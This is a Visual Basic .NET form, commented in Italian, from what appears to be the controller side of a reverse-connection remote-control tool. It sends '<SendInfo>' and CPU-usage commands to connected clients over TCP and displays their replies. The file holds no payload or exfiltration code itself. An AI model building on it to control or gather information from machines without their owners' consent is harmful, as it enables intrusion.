Imports System.Net.Sockets 'Importo il namespace System.Net.Sockets
Imports System.Text.UTF8Encoding 'Importo il namespace System.Text.UTF8Encoding per la codifica dei dati
Imports System.Net 'Importo il namespace System.Net per la gestione degli IP
Public Class frmInfoM
    Dim EC As Boolean
    Private Sub tmrDatiDa_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrDatiDa.Tick
        If EC = True Then
            If frmMain.client(lblCliIDda.Text - 1).Available > 0 Then 'Verifico se arrivano dati dal client connesso
                Dim buffer2(frmMain.client(lblCliIDda.Text - 1).Available - 1) As Byte 'Dichiaro un array di byte di dimensione pari ai dati arrivati
                frmMain.netstream(lblCliIDda.Text - 1).Read(buffer2, 0, buffer2.Length) 'Leggo i dati

                Dim msgainfo As String = UTF8.GetString(buffer2) 'Ricodifico i dati in string e li metto in una variabile

                If InStr(msgainfo, "<{INf}>") Then 'Verifico se nei dati è presente la stringa <Conne>
                    msgainfo = Replace(msgainfo, "<{INf}>", "")
                    txtInfoARR.Text = msgainfo
                    msgainfo = ""
                End If

                If InStr(msgainfo, "<RC>") Then
                    msgainfo = Replace(msgainfo, "<RC>", "")
                    txtInfoARR.Text = msgainfo
                    msgainfo = ""
                End If

            End If
        Else

            tmrDatiDa.Stop()
            frmMain.cmdClo.Enabled = False
            
            If frmMain.NumSock = 1 Then
                frmMain.tmrDati.Stop()
                frmMain.tmrPen.Stop()
                frmMain.listener(frmMain.NumSock).Stop()
                frmMain.listener(frmMain.NumSock - 1).Stop()
                frmMain.client(frmMain.NumSock - 1).Close()
                frmMain.netstream(frmMain.NumSock - 1).Close()
                If lblCliIDda.Text = 1 Then
                    frmMain.listener(lblCliIDda.Text).Stop()
                    frmMain.listener(lblCliIDda.Text - 1).Stop()
                    frmMain.client(lblCliIDda.Text - 1).Close()
                    frmMain.netstream(lblCliIDda.Text - 1).Close()
                End If
                frmMain.NumSock = 0
                frmMain.listener(0) = New TcpListener(IPAddress.Any, frmMain.nudPorta.Value) 'Assegno un istanza al primo server
                frmMain.listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                frmMain.tmrPen.Start() 'Avvio il timer che accetta connessioni
            End If

            If frmMain.NumSock > 1 Then

                For chiu2 = lblCliIDda.Text - 1 To frmMain.NumSock
                    frmMain.listener(chiu2) = frmMain.listener(chiu2 + 1)
                    frmMain.client(chiu2) = frmMain.client(chiu2 + 1)
                    frmMain.netstream(chiu2) = frmMain.netstream(chiu2 + 1)
                Next chiu2
                frmMain.NumSock = frmMain.NumSock - 1
            End If

            frmMain.lblCC.Text = "Connected Client(s): " & frmMain.NumSock
            frmMain.lstwIpReverse.Items.RemoveAt(lblCliIDda.Text - 1) 'Rimuovo dalla lista l'IP selezionato
            frmMain.cmdClo.Enabled = True
            
            If Not frmMain.FPAN(lblCliIDda.Text - 1) Is Nothing Then
                frmMain.FPAN(lblCliIDda.Text - 1).Close()
            End If

            If Not frmControlPanel.FPAN2(lblCliIDda.Text - 1) Is Nothing Then
                frmControlPanel.FPAN2(lblCliIDda.Text - 1).Close()
            End If

            Me.Close()
            MsgBox("The client was not connected", MsgBoxStyle.Exclamation, "Error")
        End If
    End Sub

    Private Sub frmInfoM_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        frmMain.ISFormOp2(Me.lblCliIDda.Text - 1) = False
    End Sub

   

    Private Sub frmInfoM_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            If Not frmMain.FPAN(frmMain.lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                frmMain.FPAN(frmMain.lstwIpReverse.SelectedIndices.Item(0)).Close()
            End If

            If Not frmControlPanel.FPAN2(frmMain.lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                frmControlPanel.FPAN2(frmMain.lstwIpReverse.SelectedIndices.Item(0)).Close()
            End If

            EC = True
            Me.Text = "Info manager - " & frmMain.lstwIpReverse.SelectedItems.Item(0).Text
            lblCliIDda.Text = frmMain.lstwIpReverse.SelectedIndices.Item(0) + 1
            tmrDatiDa.Start()
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub


   
    Private Sub GetInfoToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetInfoToolStripMenuItem.Click
        Try
            frmMain.netstream(
                    Me.lblCliIDda.Text - 1).Write(
                    UTF8.GetBytes("<SendInfo>"), 0, UTF8.GetBytes("<SendInfo>").Length) 'invio il comando il Client
        Catch ex As Exception
            EC = False
        End Try
    End Sub

    
    
    
    Private Sub frmInfoM_MouseClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseClick
        If e.Button = Windows.Forms.MouseButtons.Right Then
            cxmstrToolBoxInfo.Show(Me, New Point(e.X, e.Y))
        End If
    End Sub

    Private Sub GetCPUUsageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetCPUUsageToolStripMenuItem.Click
        Try
            frmMain.netstream(
                    Me.lblCliIDda.Text - 1).Write(
                    UTF8.GetBytes("{CPU}"), 0, UTF8.GetBytes("{CPU}").Length) 'invio il comando il Client
        Catch ex As Exception
            EC = False
        End Try
    End Sub

    Private Sub ClearTextToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClearTextToolStripMenuItem.Click
        txtInfoARR.Text = ""
    End Sub
End Class